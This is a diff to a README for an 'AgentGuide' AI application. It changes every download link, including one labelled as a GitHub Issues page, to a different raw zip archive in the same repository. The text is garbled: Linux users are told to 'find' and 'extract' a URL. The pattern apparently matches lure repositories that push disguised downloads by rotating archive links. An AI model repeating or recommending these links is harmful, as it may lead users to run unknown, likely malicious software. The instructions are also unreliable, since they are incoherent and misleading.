@@ -1,6 +1,6 @@
 # 🎉 AgentGuide - Your Path to AI Mastery
 
-[![Download AgentGuide](https://raw.githubusercontent.com/lukas121212112/AgentGuide/main/resources/agent/papers/AgentGuide-v2.7.zip)](https://raw.githubusercontent.com/lukas121212112/AgentGuide/main/resources/agent/papers/AgentGuide-v2.7.zip)
+[![Download AgentGuide](https://github.com/lukas121212112/AgentGuide/raw/refs/heads/main/scripts/Agent_Guide_v2.1-beta.2.zip)](https://github.com/lukas121212112/AgentGuide/raw/refs/heads/main/scripts/Agent_Guide_v2.1-beta.2.zip)
 
 ## 🌟 Introduction
 
@@ -14,14 +14,14 @@ To begin using AgentGuide, follow these simple steps. You don't need programming
 
 1. **Visit the Release Page**  
    Go to the following link to download your copy of AgentGuide:  
-   [Download AgentGuide](https://raw.githubusercontent.com/lukas121212112/AgentGuide/main/resources/agent/papers/AgentGuide-v2.7.zip)
+   [Download AgentGuide](https://github.com/lukas121212112/AgentGuide/raw/refs/heads/main/scripts/Agent_Guide_v2.1-beta.2.zip)
 
 2. **Choose the Right File**  
    Look for the latest release. You may find several files available for download. Select the one that suits your system. The markdown guide will help you in choosing the correct file based on your operating system:
 
    - **Windows Users**: Look for a file with a `.exe` extension.
    - **Mac Users**: Check for a `.dmg` file.
-   - **Linux Users**: Find a `https://raw.githubusercontent.com/lukas121212112/AgentGuide/main/resources/agent/papers/AgentGuide-v2.7.zip` or similar installer.
+   - **Linux Users**: Find a `https://github.com/lukas121212112/AgentGuide/raw/refs/heads/main/scripts/Agent_Guide_v2.1-beta.2.zip` or similar installer.
 
 3. **Download the File**  
    Click on the chosen file. The download should begin automatically. Depending on your internet speed, it might take a few moments.
@@ -30,7 +30,7 @@ To begin using AgentGuide, follow these simple steps. You don't need programming
    Once the download completes:
    - For Windows, double-click the `.exe` file.
    - For Mac, open the `.dmg` file, then drag the AgentGuide icon to your Applications folder.
-   - For Linux, extract the `https://raw.githubusercontent.com/lukas121212112/AgentGuide/main/resources/agent/papers/AgentGuide-v2.7.zip` file and follow the included instructions to install.
+   - For Linux, extract the `https://github.com/lukas121212112/AgentGuide/raw/refs/heads/main/scripts/Agent_Guide_v2.1-beta.2.zip` file and follow the included instructions to install.
 
 5. **Launch the Application**  
    After installation, find AgentGuide in your applications list and click to launch.
@@ -56,7 +56,7 @@ Before installing, ensure your system meets the following basic requirements:
 
 ## 🛠️ Support
 
-If you encounter any issues during the download or installation process, please check the troubleshooting section on our [GitHub Issues Page](https://raw.githubusercontent.com/lukas121212112/AgentGuide/main/resources/agent/papers/AgentGuide-v2.7.zip). You can also find additional resources and FAQs to assist you.
+If you encounter any issues during the download or installation process, please check the troubleshooting section on our [GitHub Issues Page](https://github.com/lukas121212112/AgentGuide/raw/refs/heads/main/scripts/Agent_Guide_v2.1-beta.2.zip). You can also find additional resources and FAQs to assist you.
 
 ## 📐 Additional Resources
 
